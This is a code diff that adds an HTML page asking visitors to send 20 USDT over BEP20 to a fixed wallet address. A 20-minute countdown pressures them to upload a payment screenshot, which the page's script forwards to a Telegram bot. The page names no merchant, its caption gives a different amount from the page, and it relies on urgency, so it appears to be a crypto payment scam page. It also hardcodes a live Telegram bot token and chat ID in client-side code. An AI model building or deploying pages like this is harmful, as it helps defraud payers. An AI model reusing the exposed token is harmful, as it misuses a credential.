@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT Payment</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Arial', sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 30px 20px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .qr {
+      margin: 20px 0;
+    }
+
+    .address-box {
+      background-color: rgba(0,0,0,0.4);
+      padding: 12px;
+      border-radius: 10px;
+      word-wrap: break-word;
+      font-size: 14px;
+    }
+
+    button {
+      margin-top: 10px;
+      background-color: #00bcd4;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      color: white;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #0097a7;
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    #countdown {
+      font-size: 16px;
+      margin: 10px 0;
+      color: #ffcc00;
+    }
+
+    .screenshot-title {
+      margin-top: 25px;
+      font-size: 15px;
+      color: #ff8888;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2> Pay 20 USDT( ONLY BEP20)</h2>
+  <p>MAKE PAYMENT WITH BEP20, please pay to the following address:</p>
+
+  <div class="qr">
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x9B767999d83651c244D2225A910a3a2456c98a3c" alt="QR Code">
+  </div>
+
+  <div class="address-box" id="wallet-address">0x9B767999d83651c244D2225A910a3a2456c98a3c</div>
+  <button onclick="copyAddress()">Copy Address</button>
+
+  <div class="screenshot-title">after payment upload a screenshot of the payment before the countdown ends</div>
+  <div id="countdown">19:59</div>
+
+  <button onclick="document.getElementById('screenshot').click()">Payment Done</button>
+  <input type="file" id="screenshot" accept="image/*" onchange="sendToTelegram()">
+</div>
+
+<script>
+  function copyAddress() {
+    const address = document.getElementById("wallet-address").textContent;
+    navigator.clipboard.writeText(address).then(() => {
+      alert("Address copied!");
+    });
+  }
+
+  function sendToTelegram() {
+    const fileInput = document.getElementById('screenshot');
+    const file = fileInput.files[0];
+    if (!file) return;
+
+    const botToken = "8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw";
+    const chatId = "7739393558";
+
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("caption", "Payment screenshot (10 USDT - BEP20)");
+    formData.append("photo", file);
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        alert("Screenshot sent successfully.");
+      } else {
+        alert("Sending failed. Try again.");
+      }
+    })
+    .catch(error => {
+      console.error(error);
+      alert("An error occurred while sending.");
+    });
+  }
+
+  // Countdown logic
+  let minutes = 19;
+  let seconds = 59;
+  const countdownElement = document.getElementById("countdown");
+
+  const countdown = setInterval(() => {
+    if (seconds === 0) {
+      if (minutes === 0) {
+        clearInterval(countdown);
+        countdownElement.textContent = "Time expired";
+        countdownElement.style.color = "red";
+        return;
+      }
+      minutes--;
+      seconds = 59;
+    } else {
+      seconds--;
+    }
+
+    const formatted =
+      String(minutes).padStart(2, "0") + ":" + String(seconds).padStart(2, "0");
+    countdownElement.textContent = formatted;
+  }, 1000);
+</script>
+
+</body>
+</html>
